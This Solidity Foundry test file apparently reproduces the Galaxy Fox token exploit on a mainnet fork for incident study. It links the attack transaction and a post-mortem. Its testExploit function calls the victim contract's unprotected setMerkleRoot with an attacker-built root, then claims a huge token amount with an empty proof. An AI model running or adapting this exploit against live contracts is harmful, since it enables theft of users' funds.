// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "./../interface.sol";
import "forge-std/console.sol";

// @KeyInfo - Total Lost : 330K
// Attacker : https://etherscan.io/address/0xFcE19F8f823759b5867ef9a5055A376f20c5E454
// Attack Contract : https://etherscan.io/address/0x86C68d9e13d8d6a70b6423CEB2aEdB19b59F2AA5
// Vulnerable Contract : https://etherscan.io/address/0x47c4b3144de2c87a458d510c0c0911d1903d1686
// Attack Tx : https://etherscan.io/tx/0x12fe79f1de8aed0ba947cec4dce5d33368d649903cb45a5d3e915cc459e751fc

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x47c4b3144de2c87a458d510c0c0911d1903d1686#code

// @Analysis
// Post-mortem : https://neptunemutual.com/blog/how-was-galaxy-fox-token-exploited/
// Twitter Guy : https://twitter.com/CertiKAlert/status/1788751142144401886
// Hacking God :
pragma solidity ^0.8.0;

interface IVictim {
    function setMerkleRoot(bytes32 _merkleRoot) external;

    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
}

contract GFOXExploit is Test {
    uint256 blocknumToForkFrom = 19_835_924;
    IERC20 private gfox;
    IVictim private victim;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        gfox = IERC20(0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662);
        victim = IVictim(0x11A4a5733237082a6C08772927CE0a2B5f8A86B6);
    }

    modifier balanceLog() {
        emit log_named_decimal_uint("Attacker GFOX Balance Before exploit", getBalance(gfox), 18);
        _;
        emit log_named_decimal_uint("Attacker GFOX Balance After exploit", getBalance(gfox), 18);
    }

    function testExploit() external balanceLog {
        //implement exploit code here
        // the amount of GFOX to be transferred
        uint256 amount = 1780453099185000000000000000;
        // set the merkle root
        bytes32 root = _merkleRoot(address(this), amount);
        victim.setMerkleRoot(root);
        // claim the GFOX
        victim.claim(address(this), amount, new bytes32[](0));
    }

    function _merkleRoot(address to, uint256 amount) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(to, amount));
    }

    function getBalance(IERC20 token) private view returns (uint256) {
        return token.balanceOf(address(this));
    }
}
